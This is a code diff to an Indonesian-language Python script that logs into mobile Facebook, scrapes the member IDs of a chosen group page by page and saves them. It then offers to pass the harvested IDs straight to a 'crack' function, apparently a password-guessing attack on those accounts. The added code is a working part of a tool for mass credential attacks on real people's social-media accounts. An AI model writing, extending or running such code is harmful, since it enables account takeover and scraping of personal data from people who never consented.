@@ -117,6 +117,52 @@ def saring_id_teman(r):
 	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
 		id_bteman.append(i)
 		tampil('\rc==>\rb%s\rm'%i)
+def saring_id_group1(d):
+	for i in re.findall(r'<h3><a href="/(.*?)fref=pb',d):
+		if i.find('profile.php') == -1:
+			a = i.replace('?','')
+		else:
+			a = i.replace('profile.php?id=','').replace('&amp;','')
+		if a not in id_bgroup:
+			tampil('\rk==>\rc%s'%a)
+			id_bgroup.append(a)
+def saring_id_group0():
+	global id_group
+	while 1:
+		id_group = inputD('[?]Id Group')
+		tampil('\rh[*]Mengecek Group....')
+		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
+		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
+		try:
+			next = br.find_link(url_regex= '/browse/group/members/').url
+			break
+		except:
+			tampil('\rm[!]Id yang anda masukan salah')
+			continue
+	tampil('\rh[*]Mengambil Id dari group \rc%s'%nama)
+	saring_id_group1(a)
+	return next
+def idgroup():
+	if log != 1:
+		tampil('\rh[*]Login dulu bos...')
+		login()
+		if log == 0:
+			keluar()
+	next = saring_id_group0()
+	while 1:
+		saring_id_group1(buka(next))
+		try:
+			next = br.find_link(url_regex= '/browse/group/members/').url
+		except:
+			tampil('\rm[!]Hanya Bisa Mengambil \rh %d id'%len(id_bgroup))
+			break
+	simpan()
+	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
+	if i.upper() == 'Y':
+		return crack(id_bgroup)
+	else:
+		return menu()
+
 
 def idteman():
 	if log != 1:
